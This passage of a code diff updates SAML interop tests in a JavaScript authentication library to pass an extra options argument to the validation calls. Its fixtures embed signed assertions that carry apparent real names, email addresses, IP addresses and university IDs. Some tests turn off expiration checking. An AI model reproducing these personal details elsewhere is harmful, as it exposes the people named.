AuthenticationMethod=\"urn:oasis:names:tc:SAML:1.0:am:password\" AuthenticationInstant=\"2013-07-11T12:32:02.881Z\"><saml:Subject><saml:NameIdentifier>john@fabrikam.com</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject></saml:AuthenticationStatement><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"></ds:SignatureMethod><ds:Reference URI=\"#_8c8a1b2e-7ed4-4b32-82ce-83c6d72bb297\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"></ds:DigestMethod><ds:DigestValue>8Yi8+vbZagbCsopdmXFjeFvexHlkHYAViSf9w3yFbWo=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>SzQaNU4uo4IPJTsK3DZkYNx1FzpAoIxXyWiOMJyuUScYbvUHMjxoPsh6KJrkLwUIGnv07TpTFKrhjA/tGzLCwPMOWlpGp66N/U9wWe3vshHyW34/oAq14EwptjmXEPpHjR2P+giJAUJ0VTXIvbTsGNLuDVV/px43CoIX2D6jc8yt8VffAMX4R+WzI2a6QRMqglTbxzFEfcJC1yK9jT/UzjRIKe9bMS2T8kupDaGOWYj4XMh9BkIVXV40jJakss+cF4wjO/LWfpbwZwMzfOXBQV+W6O5X/HfTod/4zzmdFKjArx6vXQl7vCRr9AXUGgbPWdtSVK7HSMCyjZiAOGcr0Q==</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Data><X509Certificate>MIIC5DCCAcygAwIBAgIQGmfE0ae34q1IXJvpfhwYVDANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDEyNBREZTIFNpZ25pbmcgLSB0ZXN0LWFkZnMuYXV0aDEwLmNvbTAeFw0xMzAyMTIwMzU3MzlaFw0xNDAyMTIwMzU3MzlaMC4xLDAqBgNVBAMTI0FERlMgU2lnbmluZyAtIHRlc3QtYWRmcy5hdXRoMTAuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuNaTwlMjKeXVabhVQJjmjousrLuYi5hxELIQX80ZT3/kTsRUQaP6AoCMEYjofcV6QnxQeHxHJgzcy5t4bmHozIsLYlroH7PaDNqXLnX+6ivAX1nFa9IOeaw3X206oGmCSo6pJxbW8LwXjYC7BYrINitm/mgcOrypbasADvO1j+fyjkBTFPuF2+La4ehwGCKdrvZZF0lDKiHPbCI8xqH7HOgX+QLtnhK2WclDIpcPd2eeaVq1fB8XBwTXNOv2ZdaEi2i3mDXQoa8wZVozqs5h6OKVXl7hNQH2/qUDAZc15kZcR9Zcxyo5v0GtqYS3J70Q+8HkuQfYTBGR+Cum9S+bfQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQAVf930SJfJquM/4A3vibsmjRuCytHeEXLrEyt0j/NBDnyLqFMoL7qILfqtK3oSmQNb6PRQiLLFJlIz7fnkj6k3hm4qpJJvjyqcxYDeW6SK8yP7zKNGMeyIMs/humVgXWALkTF6PoFIfFo2lfnHAzHqPE06WN+hcYHRBjuR5/T+58l2LH9vJjPHuceGkWXyQCB/Hd2riNElXODIBEKzzKL923rm3oPaH/Un8TYnpyRRVKLd40DiptbY/E7YpzWrOsUppjsm0pUhdvBYjihLc6PhALzoUC3GwMjUK0T70gqRoGzsiqRIjIEC35QBGKavzhya2DLTZK3Pf70eJpkp1bGL</X509Certificate></X509Data></KeyInfo></ds:Signature></saml:Assertion>';\n \n     var saml_passport = new SamlPassport({thumbprints: ['C9018666E764613366C20BC011D947B39BED236B'],\n-                                          realm: 'urn:auth0:auth0',\n-                                          checkExpiration: false,\n-                                          checkRecipient: false}); // dont check expiration since we are harcoding the token\n-    var profile = saml_passport.validateSamlAssertion(signedAssertion, function(err, profile) {\n+      realm: 'urn:auth0:auth0',\n+      checkExpiration: false,\n+      checkRecipient: false}); // dont check expiration since we are harcoding the token\n+    var profile = saml_passport.validateSamlAssertion(signedAssertion, {}, function(err, profile) {\n       if (err) return done(err);\n       assert.ok(profile);\n       done();\n\n@@ -210,10 +209,10 @@\ndescribe('interop', function () {\n     var signedAssertion = '<saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"_071de65ecb79185206fcb0789e9afd90\" IssueInstant=\"2014-04-06T22:27:04.997Z\" Version=\"2.0\"><saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\">https://aai-logon.ethz.ch/idp/shibboleth</saml2:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"></ds:SignatureMethod><ds:Reference URI=\"#_071de65ecb79185206fcb0789e9afd90\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"><ec:InclusiveNamespaces xmlns:ec=\"http://www.w3.org/2001/10/xml-exc-c14n#\" PrefixList=\"xs\"></ec:InclusiveNamespaces></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"></ds:DigestMethod><ds:DigestValue>jVMwKZ5O3hXfOf6tkVan2hnPW2w=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>nq5nJangoli5J6uBF/sEeYyKL7+xepbsDmjT6mpggLmba6yR+lQaZmAGnti8nhZUPyXwZfZS3d9oH4upbRg56jdVVcPaZUhYOPW2T2etm7lxxaDlHDJo/E40KnBtGMn6Oxz23hXUrc6p6K4FFLCQwmsE3ZZlP/u8DcqKNl5X/D5udcCV75mjxnVKWuXu34Xw4uQEQBb+6UfGjDN1/91M6U3ZZ0iOSRsBC7+SYLVMbDZqGveioKjZMPBuHmoBwQxsCixu1var3LNyCFVRo0LV9qA5DhA5lyH209+kFsN9vqzHKkiOF+Wua+Ngh2oR/48CWfTOjDuvRpje1bICIwwCQg==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIFjzCCBHegAwIBAgIUZ+QtvaEucMtOcruHlzQrEDH92FMwDQYJKoZIhvcNAQEFBQAwazELMAkG\\nA1UEBhMCQk0xGTAXBgNVBAoTEFF1b1ZhZGlzIExpbWl0ZWQxHzAdBgNVBAsTFnd3dy5xdW92YWRp\\nc2dsb2JhbC5jb20xIDAeBgNVBAMTF1F1b1ZhZGlzIEdsb2JhbCBTU0wgSUNBMB4XDTEzMDQxNzA4\\nMDYwNFoXDTE1MDQxNzA4MDYwNFowYzELMAkGA1UEBhMCQ0gxEDAOBgNVBAgTB1p1ZXJpY2gxEDAO\\nBgNVBAcTB1p1ZXJpY2gxFDASBgNVBAoTC0VUSCBadWVyaWNoMRowGAYDVQQDExFhYWktbG9nb24u\\nZXRoei5jaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOJWLI4vWx5HnqUvkBDm5Egp\\nUg8yOlL3HbS0Y62/k77R2W9wxNczcR79wUBl2cNDCF/LxzdY1ml2u2skbZy4tqtmcvHVrwM5RVDb\\n3jpjUhzBlD5rkpxgut2zFmNsahXzceD9dzsTvq7MUq6YgW6iRY3wNbes7ZgRtdkCz+vbiB52iTES\\nZ2lo6fBn69eiqywUhQ5t/K4jGqpSUf1DITz//lMWRveagVyUq342JONxo93nt6x6ewGg+Qo8yCuC\\nj4VehpncHYV0oNI2sSncKPm23Z4TNxPDalSaq8R5nKhueG+FHX7Ks8hWYSf42m2rrZLTumv2Ry8H\\nFrPFkI7kuSFwVRECAwEAAaOCAjEwggItMHQGCCsGAQUFBwEBBGgwZjAqBggrBgEFBQcwAYYeaHR0\\ncDovL29jc3AucXVvdmFkaXNnbG9iYWwuY29tMDgGCCsGAQUFBzAChixodHRwOi8vdHJ1c3QucXVv\\ndmFkaXNnbG9iYWwuY29tL3F2c3NsaWNhLmNydDCBtQYDVR0RBIGtMIGqghFhYWktbG9nb24uZXRo\\nei5jaIIPdmNpcGhlci5ldGh6LmNogg92Y2Flc2FyLmV0aHouY2iCD3ZjdXJ0ZXIuZXRoei5jaIIP\\ndmNvcHBlci5ldGh6LmNogg92Y2Vuc29yLmV0aHouY2iCEmxkYXBzLWluZm8uZXRoei5jaIIPbGlu\\ndGVzdC5ldGh6LmNogRt2bGFkaXNsYXYubmVzcG9yQGlkLmV0aHouY2gwUQYDVR0gBEowSDBGBgwr\\nBgEEAb5YAAJkAQEwNjA0BggrBgEFBQcCARYoaHR0cDovL3d3dy5xdW92YWRpc2dsb2JhbC5jb20v\\ncmVwb3NpdG9yeTAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMC\\nMB8GA1UdIwQYMBaAFDJNoU/q8K6Ztu6bByyECBFQi+J+MDsGA1UdHwQ0MDIwMKAuoCyGKmh0dHA6\\nLy9jcmwucXVvdmFkaXNnbG9iYWwuY29tL3F2c3NsaWNhLmNybDAdBgNVHQ4EFgQUUrfY5AJdnN5W\\n9TTyrVObbQEoH/cwDQYJKoZIhvcNAQEFBQADggEBAJHQIjLbalw9LF9wIjhhOsEsaf/Bd8dSKcb2\\nICLC16TyetuTTJfqHqHr3QiAcrSNKOxqoFBX51t7oNyd3n1BGxJeYmpoyKHKmViUF9mJWBKxSvfW\\njmYA7M/LptNX+aUz0fPntCokjH5pPAk3n5YYf2gTFOmRbZDdvNxQ0+o5EkRKkxLDAYM7HlJshWfK\\nyY8ZKiPSx28ebXORGzW/VC5VunURFPmhvy5hUFo2qFhGhkQZD1Tg5uN+vd7KywgXLiQKWFDweOxY\\nkFuTatM9peWNaapAuaYL8D6q/pn6q76cDKiMjTLp1siQsVVzFAZNjywOve5tdqB/Qo7zwX7TggF1\\nmrQ=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml2:Subject><saml2:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\" NameQualifier=\"https://aai-logon.ethz.ch/idp/shibboleth\">_e132eb870c4a912c56e1bafeb5257b35</saml2:NameID><saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml2:SubjectConfirmationData Address=\"80.218.183.64\" InResponseTo=\"_e8cda4c13682e111e66d\" NotOnOrAfter=\"2014-04-06T22:32:04.997Z\" Recipient=\"https://fmi-test.auth0.com/login/callback\"></saml2:SubjectConfirmationData></saml2:SubjectConfirmation></saml2:Subject><saml2:Conditions NotBefore=\"2014-04-06T22:27:04.997Z\" NotOnOrAfter=\"2014-04-06T22:32:04.997Z\"><saml2:AudienceRestriction><saml2:Audience>urn:auth0:fmi-test</saml2:Audience></saml2:AudienceRestriction></saml2:Conditions><saml2:AuthnStatement AuthnInstant=\"2014-04-06T22:27:04.858Z\" SessionIndex=\"_ff0e0b5d9d6706bc22561c49c7eac971\"><saml2:SubjectLocality Address=\"80.218.183.64\"></saml2:SubjectLocality><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement><saml2:AttributeStatement><saml2:Attribute FriendlyName=\"eduPersonAffiliation\" Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">member</saml2:AttributeValue><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">staff</saml2:AttributeValue><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">student</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"sn\" Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Gn&#x00FC;gge</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"givenName\" Name=\"urn:oid:2.5.4.42\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">Robert</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"swissEduPersonHomeOrganization\" Name=\"urn:oid:2.16.756.1.2.5.1.1.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">ethz.ch</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"swissEduPersonUniqueID\" Name=\"urn:oid:2.16.756.1.2.5.1.1.1\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">187624@ethz.ch</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"swissEduPersonHomeOrganizationType\" Name=\"urn:oid:2.16.756.1.2.5.1.1.5\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">university</saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"eduPersonTargetedID\" Name=\"urn:oid:1.3.6.1.4.1.5923.1.1.1.10\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue><saml2:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" NameQualifier=\"https://aai-logon.ethz.ch/idp/shibboleth\" SPNameQualifier=\"urn:auth0:fmi-test\">37J7PjSu8hkThPDMZOfZLtca0Ag=</saml2:NameID></saml2:AttributeValue></saml2:Attribute><saml2:Attribute FriendlyName=\"mail\" Name=\"urn:oid:0.9.2342.19200300.100.1.3\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml2:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">robert.gnuegge@bsse.ethz.ch</saml2:AttributeValue></saml2:Attribute></saml2:AttributeStatement></saml2:Assertion>';\n \n     var saml_passport = new SamlPassport({thumbprints: ['42FA24A83E107F6842E05D2A2CA0A0A0CA8A2031'],\n-                                          realm: 'urn:auth0:fmi-test',\n-                                          recipientUrl: 'https://fmi-test.auth0.com/login/callback',\n-                                          checkExpiration: false}); // dont check expiration since we are harcoding the token\n-    var profile = saml_passport.validateSamlAssertion(signedAssertion, function(err, profile) {\n+      realm: 'urn:auth0:fmi-test',\n+      recipientUrl: 'https://fmi-test.auth0.com/login/callback',\n+      checkExpiration: false}); // dont check expiration since we are harcoding the token\n+    var profile = saml_passport.validateSamlAssertion(signedAssertion, {}, function(err, profile) {\n       if (err) return done(err);\n       assert.ok(profile);\n       done();\n\n@@ -240,7 +239,7 @@\ndescribe('interop', function () {\n     var saml_passport = new SamlPassport(samlOptions);\n     var sp = new samlp(samlpOptions, saml_passport);\n \n-    sp.validateSamlResponse(signedResponse, function(err, profile) {\n+    sp.validateSamlResponse(signedResponse, {}, function(err, profile) {\n       if (err) return done(err);\n       assert.ok(profile);\n       expect(profile).to.have.property('http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier', 'kchen\u4e03\u5473@shichimitogarashi.org');\n\n@@ -265,13 +264,13 @@\ndescribe('interop', function () {\n     var sm = new SamlPassport(samlOptions);\n     var sp = new samlp(samlpOptions, sm);\n \n-    sp.validateSamlResponse(new Buffer(response, 'base64').toString(),\n-      function(err, profile){\n-        if (err) return done(err);\n-        assert.ok(profile);\n-        expect(profile['fname']).to.equal('Pushp');\n-        done();\n-      });\n+    sp.validateSamlResponse(new Buffer(response, 'base64').toString(), {},\n+        function(err, profile){\n+          if (err) return done(err);\n+          assert.ok(profile);\n+          expect(profile['fname']).to.equal('Pushp');\n+          done();\n+        });\n \n   });\n\n@@ -291,14 +290,14 @@\ndescribe('interop', function () {\n     var sm = new SamlPassport(samlOptions);\n     var sp = new samlp(samlpOptions, sm);\n \n-    sp.validateSamlResponse(new Buffer(response, 'base64').toString(),\n-      function(err, profile){\n-        if (err) {\n-          assert.ok(err);\n-          return done();\n-        }\n-        done('error expected');\n-      });\n+    sp.validateSamlResponse(new Buffer(response, 'base64').toString(), {},\n+        function(err, profile){\n+          if (err) {\n+            assert.ok(err);\n+            return done();\n+          }\n+          done('error expected');\n+        });\n   });\n \n   it('should validate an assertion from RSA IDM with no embedded signature and supplying a cert', function (done) {\n\n@@ -321,13 +320,13 @@\ndescribe('interop', function () {\n     var sm = new SamlPassport(samlOptions);\n     var sp = new samlp(samlpOptions, sm);\n \n-    sp.validateSamlResponse(new Buffer(response, 'base64').toString(),\n-      function(err, profile){\n-        if (err) return done(err);\n-        assert.ok(profile);\n-        expect(profile['email']).to.equal('ricky.brown@emc.com');\n-        done();\n-      });\n+    sp.validateSamlResponse(new Buffer(response, 'base64').toString(), {},\n+        function(err, profile){\n+          if (err) return done(err);\n+          assert.ok(profile);\n+          expect(profile['email']).to.equal('ricky.brown@emc.com');\n+          done();\n+        });\n \n     function pemToCert(pem) {\n       var cert = /-----BEGIN CERTIFICATE-----([^-]*)-----END CERTIFICATE-----/g.exec(pem.toString());\n\n@@ -358,7 +357,7 @@\ndescribe('interop', function () {\n     var sm = new SamlPassport(samlOptions);\n     var sp = new samlp(samlpOptions, sm);\n \n-    sp.validateSamlResponse(new Buffer(response, 'base64').toString(), function (err){\n+    sp.validateSamlResponse(new Buffer(response, 'base64').toString(), {}, function (err){\n       assert.ok(err);\n       expect(err.toString()).to.equal('Error: Invalid thumbprint (configured: ANOTHER_THUMB. calculated: CD78CA598A6FB28A4D70EF6846C1141666A24240)');\n       done();\n\n@@ -461,40 +460,4 @@\ndescribe('interop', function () {\n       s._authenticate_saml(req);\n     });\n   });\n-\n-\n-  // it('should validate a saml response from datapower', function (done) {\n-  //   var SAMLResponse = '<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" Version=\"2.0\" ID=\"SAML-309e11f6-3b9e-4452-9db6-d3cf6cf99d9f\" IssueInstant=\"2013-05-08T21:55:08Z\" Destination=\"http://epolicy.azurewebsites.net/\"><saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">www.axa-equitable.com</saml2:Issuer><samlp2:Status><samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp2:Status><saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"SAML-02cd7eb4-0117-4dee-bee9-31bf076e709e\" IssueInstant=\"2013-05-08T21:55:08Z\"><saml2:Issuer>www.axa-equitable.com</saml2:Issuer><saml2:Subject><saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">Christopher.Owen@axa-advisors.com.datastage</saml2:NameID><saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml2:SubjectConfirmationData NotOnOrAfter=\"2013-05-08T22:55:08Z\" Recipient=\"http://epolicy.azurewebsites.net/\"/></saml2:SubjectConfirmation></saml2:Subject><saml2:Conditions NotBefore=\"2013-05-08T21:55:08Z\" NotOnOrAfter=\"2013-05-08T22:55:08Z\"/><saml2:AuthnStatement AuthnInstant=\"2013-05-08T21:55:08Z\" SessionNotOnOrAfter=\"2013-05-08T22:55:08Z\"><saml2:SubjectLocality Address=\"10.74.68.219\"/><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement><saml2:AttributeStatement><saml2:Attribute Name=\"userid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>3338532</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"firstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Christopher</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"lastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Owen</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"emailAddress\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Christopher.Owen@axa-advisors.com.datastage</saml2:AttributeValue></saml2:Attribute></saml2:AttributeStatement></saml2:Assertion><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\"/><SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><Reference URI=\"#SAML-309e11f6-3b9e-4452-9db6-d3cf6cf99d9f\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><DigestValue>7mSr1qvkKTrrV2bV+HFVJKpKaCI=</DigestValue></Reference></SignedInfo><SignatureValue>BQTRkGg8M/g2LpkgvW3MQG/B0cDxsz0zHa2wejIN2010r+hS4BCj7YcIH319R+Y4oZTmlxmJIT/4wlR9rxHQWxX95jdB1DfeoUMLAlk2JfAT+ByZ14F+N4B7lDILuNUTrDBNa9GLDIo8MyAK8SBUdeyqDtNFqb44/gGg6B0h2qEbDNLHY7WlAxvz4TfndKqk5v/VP96xiCS4d1AjYPvUL8EzR5kS83ABHX0jg2bYxdtctdiKOilcHQOHEIKosWw86b9uDQPjIrSt1JzW8SSSeA6M3nJ7HJ/5EsSYEMvt/FshBnKP2LI4HMGktlzw/9gOnmxR/CQykMmN2vvCwPsnXA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIFQTCCBCmgAwIBAgIETB7lIzANBgkqhkiG9w0BAQUFADCBsTELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUVudHJ1c3QsIEluYy4xOTA3BgNVBAsTMHd3dy5lbnRydXN0Lm5ldC9ycGEgaXMgaW5jb3Jwb3JhdGVkIGJ5IHJlZmVyZW5jZTEfMB0GA1UECxMWKGMpIDIwMDkgRW50cnVzdCwgSW5jLjEuMCwGA1UEAxMlRW50cnVzdCBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eSAtIEwxQzAeFw0xMzAxMzExNTM2MjBaFw0xNTAzMzAxOTA2MTJaMIGGMQswCQYDVQQGEwJVUzERMA8GA1UECBMITmV3IFlvcmsxETAPBgNVBAcTCE5ldyBZb3JrMS0wKwYDVQQKEyRBWEEgRXF1aXRhYmxlIExpZmUgSW5zdXJhbmNlIENvbXBhbnkxIjAgBgNVBAMTGXJ0aWdpbnQuYXhhLWVxdWl0YWJsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCn6cGpvyzVSQ2c1oK7LzuxUXW4sxBOTGLVCqo4FWcta7QAU7RU5i3ATWxyo9HFmD8Qcyj6YuIQYtljJFAx/JcZigtXNRVudtl0uuvCUTGfsR67+gGRWe7hNg/9gIWLXZGkikRT4g9yBqutMzHeuX0ecignFHJxw5S7p1rtxJmuXQR/8uOeAse+48PkZcCHFdzBp6u3Z+pzite12LA2F8C0K5nv9FgkHVEQjqgtgAjKin2QmWqI1gj6mIe0oMxWB4l3j7dsEXVO4zPU1ujIylY0y2QnK4PbNdGu+W1GElwvUhSaz+jmIUFWklJtsFyhFVGcgFRE5iXXmrlnK4GZv3/FAgMBAAGjggGIMIIBhDALBgNVHQ8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMDMGA1UdHwQsMCowKKAmoCSGImh0dHA6Ly9jcmwuZW50cnVzdC5uZXQvbGV2ZWwxYy5jcmwwZAYIKwYBBQUHAQEEWDBWMCMGCCsGAQUFBzABhhdodHRwOi8vb2NzcC5lbnRydXN0Lm5ldDAvBggrBgEFBQcwAoYjaHR0cDovL2FpYS5lbnRydXN0Lm5ldC8yMDQ4LWwxYy5jZXIwSgYDVR0gBEMwQTA1BgkqhkiG9n0HSwIwKDAmBggrBgEFBQcCARYaaHR0cDovL3d3dy5lbnRydXN0Lm5ldC9ycGEwCAYGZ4EMAQICMCQGA1UdEQQdMBuCGXJ0aWdpbnQuYXhhLWVxdWl0YWJsZS5jb20wHwYDVR0jBBgwFoAUHvGriQb4SQ8BM3fuFHruGXyTKE0wHQYDVR0OBBYEFJSL34z5hLkS08mEdEodVmeUrUC5MAkGA1UdEwQCMAAwDQYJKoZIhvcNAQEFBQADggEBAFCpXB2HagR+B4C5XKbtBPNZ3F94zJoFlCb+7/5Q9HWMGew1XiRx7GFhV4FCIsr6Gp9EYFLlVO+afdSMvNC7RauZ6nw7ylK8yRyuvbpJWC+XAfP4nVKroYYFPmKJdkELIBLIwt1Nsr3KsY0JIykokuQR/pWDSNVgo3arsNxXOhvxate0yoloMCUhHh+9b8WRY2JECN6fAEpg54pr5cjTCOCLFEN37M3Hl1+LRYNb6XAKUiL4b5CNkd/qUI5PZsJvGg/AOYRiCPY3iZezs9OT1RCkBrgM1W9rRF/zXCniRV3ASH22AU1jUn0OT1wy9B8PO15liIzw4WuYIdFqCxaIyJE=</X509Certificate><X509IssuerSerial><X509IssuerName>CN=Entrust Certification Authority - L1C, OU=\"(c) 2009 Entrust, Inc.\", OU=www.entrust.net/rpa is incorporated by reference, O=\"Entrust, Inc.\", C=US</X509IssuerName><X509SerialNumber>1277093155</X509SerialNumber></X509IssuerSerial></X509Data></KeyInfo></Signature></samlp2:Response>';\n-  //   //var SAMLResponse = '<samlp2:Response xmlns:samlp2=\"urn:oasis:names:tc:SAML:2.0:protocol\" Version=\"2.0\" ID=\"SAML-309e11f6-3b9e-4452-9db6-d3cf6cf99d9f\" IssueInstant=\"2013-05-08T21:55:08Z\" Destination=\"http://epolicy.azurewebsites.net/\"><saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">www.axa-equitable.com</saml2:Issuer><samlp2:Status><samlp2:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp2:Status><saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"SAML-02cd7eb4-0117-4dee-bee9-31bf076e709e\" IssueInstant=\"2013-05-08T21:55:08Z\"><saml2:Issuer>www.axa-equitable.com</saml2:Issuer><saml2:Subject><saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">Christopher.Owen@axa-advisors.com.datastage</saml2:NameID><saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml2:SubjectConfirmationData NotOnOrAfter=\"2013-05-08T22:55:08Z\" Recipient=\"http://epolicy.azurewebsites.net/\"/></saml2:SubjectConfirmation></saml2:Subject><saml2:Conditions NotBefore=\"2013-05-08T21:55:08Z\" NotOnOrAfter=\"2013-05-08T22:55:08Z\"/><saml2:AuthnStatement AuthnInstant=\"2013-05-08T21:55:08Z\" SessionNotOnOrAfter=\"2013-05-08T22:55:08Z\"><saml2:SubjectLocality Address=\"10.74.68.219\"/><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement><saml2:AttributeStatement><saml2:Attribute Name=\"userid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>3338532</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"firstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Christopher</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"lastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Owen</saml2:AttributeValue></saml2:Attribute><saml2:Attribute Name=\"emailAddress\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\"><saml2:AttributeValue>Christopher.Owen@axa-advisors.com.datastage</saml2:AttributeValue></saml2:Attribute></saml2:AttributeStatement></saml2:Assertion></samlp2:Response>';\n-\n-  //   // 